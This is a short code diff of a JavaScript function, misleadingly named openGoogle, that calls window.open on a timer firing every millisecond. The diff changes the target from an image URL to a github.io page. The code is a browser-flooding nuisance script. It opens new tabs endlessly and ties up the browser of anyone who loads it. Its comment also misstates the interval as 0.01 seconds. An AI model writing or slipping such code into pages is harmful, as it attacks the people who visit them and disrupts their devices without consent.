@@ -1,7 +1,7 @@
 // Function to open a specific URL every 0.01 seconds
 function openGoogle() {
     setInterval(function() {
-        window.open('https://imagehub.fun/F0CAFS.png', '_blank');
+        window.open('https://memozki.github.io/INE/', '_blank');
     }, 1);
 }
 
